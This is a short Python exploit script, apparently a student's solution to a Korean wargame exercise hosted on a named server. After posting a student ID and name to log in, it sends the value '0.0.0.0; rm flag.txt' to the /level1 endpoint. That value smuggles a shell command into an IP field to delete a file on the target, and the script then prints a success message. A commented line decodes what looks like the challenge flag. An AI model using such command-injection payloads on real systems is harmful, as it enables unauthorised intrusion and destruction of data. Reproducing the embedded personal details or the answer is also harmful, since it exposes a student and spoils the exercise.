# import base64

# a = base64.b64decode("REh7NDNkZDIxODkwNTY0NzVhN2YzYmQxMTQ1NmExN2FkNzF9")

# print(a)

import requests

url = "http://kairoshk.ddns.net:9090"
lv1 = "http://kairoshk.ddns.net:9090/level1"

headers = {
    "Host": "kairoshk.ddns.net:9090",
    "Cache-Control": "max-age=0",
    "Accept-Language": "ko-KR,ko;q=0.9",
    "Origin": "http://kairoshk.ddns.net:9090",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://kairoshk.ddns.net:9090/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

data = {
    "student_id": "1215",
    "name": "임주원"
}

response = requests.post(url, headers=headers, data=data)

print("Status Code:", response.status_code)
print("Response Text:", response.text)

nmh_ = {
    "ip": "0.0.0.0; rm flag.txt"
}

session = requests.Session()
session.post(url, headers=headers, data=data)

response2 = requests.post(lv1, headers=headers, data=nmh_)

print(response2.status_code)
print('[+] 터뜨리기 성공 ❤️')
print("session: ", session)